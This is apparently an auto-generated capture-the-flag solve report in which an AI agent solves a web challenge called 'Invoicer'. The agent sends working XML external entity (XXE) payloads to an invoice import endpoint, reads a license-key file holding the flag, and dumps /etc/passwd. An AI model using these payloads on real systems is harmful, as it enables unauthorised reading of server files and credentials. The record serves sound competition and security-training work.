# Invoicer [EASY]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 150
- **Solves**: 6
- **Flag**: `FLAG{xx3-l34ks-th3-l1c3ns3-k3y}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.00 (winner $0.00)
- **Wall time**: 12s
- **Traces**: 1

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
Invoicer imports supplier invoices in an XML interchange format. Paste some invoice XML and it parses and imports the fields.
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8005
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 6 | $0.00 | 12s | `trace-Invoicer_[EASY]-deepseek-flash-20261029-123141.jsonl` |

_Window: 2026-10-29T12:31:43 to 2026-10-29T12:31:56_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8005/ | head -60",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 09:31:46 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 6673

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Invoicer — Import</title>
<style>
  :root{--bg:#fbf6f7;--panel:#fff;--ink:#2a1218;--muted:#7c6168;--line:#f0e4e7;
        --brand:#e11d48;--brand-ink:#be123c;--brand-soft:#ffe4e9;--ok:#059669;
        --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
  a{color:var(--brand);text-decoration:none}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
  .logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#fb7185,#e11d48);display:grid;place-items:center;color:#fff;font-weight:800;box-shadow:var(--shadow)}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "curl -s http://chal2.hackathon.ke:8005/ | tail -80",
  "timeout_seconds": 60
}
~~~

~~~
.nav-item{display:flex;align-items:center;gap:10px;padding:9px 11px;border-radius:9px;color:#4a3139;font-weight:500;cursor:pointer}
  .nav-item:hover{background:#fdeef1}.nav-item.active{background:var(--brand-soft);color:var(--brand-ink)}
  main{grid-area:main;padding:26px 30px;overflow:auto;max-width:900px}
  .page-head{margin-bottom:18px}.page-head h2{margin:0;font-size:22px}.page-head .sub{color:var(--muted);margin-top:2px}
  .card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow);padding:20px;margin-bottom:18px}
  .card h3{margin:0 0 4px;font-size:15px}
  textarea{width:100%;min-height:150px;padding:12px;border:1px solid var(--line);border-radius:9px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;resize:vertical}
  textarea:focus{outline:none;border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-soft)}
  .rowbtns{display:flex;gap:10px;margin-top:12px;align-items:center}
  .out{margin-top:14px;display:none}
  .kv{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px dashed var(--line);font-size:13.5px}
  .kv .k{color:var(--muted)}.kv .v{font-family:ui-monospace,Menlo,monospace}
... [2000 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "curl -s http://chal2.hackathon.ke:8005/sample-invoice.xml; echo; curl -s -X POST http://chal2.hackathon.ke:8005/api/invoices/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><invoice><customer>Acme</customer><amount>49</amount><currency>USD</currency><notes>hi</notes></invoice>'",
  "timeout_seconds": 60
}
~~~

~~~
<?xml version="1.0" encoding="UTF-8"?>
<invoice>
  <customer>Acme Corp</customer>
  <amount>49.00</amount>
  <currency>USD</currency>
  <notes>Monthly subscription</notes>
</invoice>

{"imported":{"amount":"49","currency":"USD","customer":"Acme","notes":"hi"},"ok":true}
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /tmp; cat > x.xml <<'EOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE invoice [<!ENTITY xxe SYSTEM \"file:///tmp/invoicer/license.key\">]>\n<invoice><customer>&xxe;</customer><amount>1</amount></invoice>\nEOF\ncurl -s -X POST http://chal2.hackathon.ke:8005/api/invoices/import -H 'Content-Type: application/xml' --data-binary @x.xml; echo\ncat > x2.xml <<'EOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE invoice [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<invoice><customer>&xxe;</customer></invoice>\nEOF\ncurl -s -X POST http://chal2.hackathon.ke:8005/api/invoices/import -H 'Content-Type: application/xml' --data-binary @x2.xml",
  "timeout_seconds": 60
}
~~~

~~~
{"imported":{"amount":"1","currency":null,"customer":"FLAG{xx3-l34ks-th3-l1c3ns3-k3y}\n","notes":null},"ok":true}

{"imported":{"amount":null,"currency":null,"customer":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\napp:x:999:999::/home/app:/bin/sh\n","notes":null},"ok":true}
~~~

### Step 6: `submit_flag`
~~~
{
  "flag": "FLAG{xx3-l34ks-th3-l1c3ns3-k3y}"
}
~~~

~~~
DRY RUN — would submit "FLAG{xx3-l34ks-th3-l1c3ns3-k3y}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{xx3-l34ks-th3-l1c3ns3-k3y}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.00 (winner), $0.00 (whole swarm)
- **Wall time**: 12s
- **Generated**: 2026-10-30T00:14:55
